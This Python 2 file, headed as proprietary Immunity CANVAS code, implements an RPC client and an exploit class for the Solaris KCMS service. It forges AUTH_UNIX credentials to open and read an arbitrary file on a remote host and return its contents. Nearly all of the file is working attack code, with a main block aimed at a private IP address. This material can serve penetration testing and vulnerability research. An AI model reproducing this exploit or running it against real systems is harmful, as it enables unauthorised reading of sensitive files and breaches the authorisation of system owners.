#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import socket
import os
from libs import xdr
from libs import rpc
import struct
from libs.rpc import Packer, Unpacker, TCPClient


class KCMSException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`

class KCMS_Packer(Packer):
    
    def pack_kcms_openfile_req(self, ra):
        rfile, flag, mode = ra 
        self.pack_string(rfile)
        self.pack_int(flag)
        self.pack_int(mode)

    def pack_kcms_readfile_req(self, ra):
        filefd, filesz = ra
        self.pack_int(filefd)
        #offset in file lseek style, should be _zero_
        self.pack_int(0)
        self.pack_int(filesz)

    def pack_kcms_closefile_req(self, filefd):
        self.pack_int(filefd)
        

class KCMS_Unpacker(Unpacker):
    
    def unpack_kcms_openfile_reply(self):
        ack = self.unpack_int()
        filesize = self.unpack_int()
        filefd = self.unpack_int()
        return (ack, filesize, filefd)

    def unpack_kcms_readfile_reply(self):
        ack = self.unpack_int()
        file_cont = self.unpack_array(self.unpack_int)
        return (ack, file_cont)

    def unpack_kcms_closefile_reply(self):
        return self.unpack_int() #ack
    
    
class KCMS_Client(TCPClient):

    def __init__(self, target):
        self.kcms_d = { "PROGNUM": 100221, "VERSNUM": 1, "OPEN_FILE": 1003, "CLOSE_FILE": 1004, "READ_FILE": 1005 }
        TCPClient.__init__(self, target, self.kcms_d["PROGNUM"], self.kcms_d["VERSNUM"])

    def addpackers(self):
        #print "addpackers()"
        self.packer = KCMS_Packer()
        self.unpacker = KCMS_Unpacker("")

    def mkcred(self):
        import random
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1,99999),\
                                                      "localhost", 0, 0, [])
        return self.cred
    
    def open_file(self, rfile, flag, mode):
        return self.make_call(self.kcms_d["OPEN_FILE"], (rfile, flag, mode),\
                              self.packer.pack_kcms_openfile_req,\
                              self.unpacker.unpack_kcms_openfile_reply)

    def read_file(self, fd, size):
        return self.make_call(self.kcms_d["READ_FILE"], (fd, size),\
                              self.packer.pack_kcms_readfile_req,\
                              self.unpacker.unpack_kcms_readfile_reply)

    def close_file(self, fd):
        return self.make_call(self.kcms_d["CLOSE_FILE"], fd,\
                              self.packer.pack_kcms_closefile_req,\
                              self.unpacker.unpack_kcms_closefile_reply)
    
    
class KCMSExploit(KCMS_Client):
    
    def __init__(self, target="", rfile="", timeout = 5):
        self.tm = timeout
        self.set_target(target)
        self.rfile = rfile
        
    def set_target(self, ip):
        try:
            self.target = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise KCMSException, "KCMSExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.target
    
    def set_rfile(self, rfile):
        self.rfile = rfile

    def get_rfile(self):
        return self.rfile

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            KCMS_Client.__init__(self, self.target)
        except (socket.error, RuntimeError), self.err:
            raise KCMSException, str(self.err)
        
    def run(self):
        
        self.ack, self.size, self.fd = self.open_file(self.rfile, 0, 0755)

        if self.ack:
            raise KCMSException, str(self.ack) + " Can not open file: " + self.rfile
        
        self.content = self.read_file(self.fd, self.size)

        if len(self.content[1]) < 1:
            raise KCMSException, "Can not reat from file: " + self.rfile

        if len(self.content[1]) < self.size:
            print "File is partially read, total bytes read is: %d" % len(self.content)
        
        self.int = 0
        self.cont = ""
        
        for self.int in self.content[1]:
            try:
                self.cont += chr(self.int)
            except ValueError:
                self.cont += struct.pack("=b", self.int)
                
        self.ack = self.close_file(self.fd)

        if self.ack:
            raise KCMSException, "Can not close file: " + self.rfile

        return self.cont
    
            
if __name__ == "__main__":

    kcms = KCMSExploit("172.17.1.166", "foo")

    kcms.set_target("172.17.1.166")
    kcms.set_rfile("foo")
    print kcms.get_target(), kcms.get_rfile()
    kcms.setup()
    print kcms.run()
    
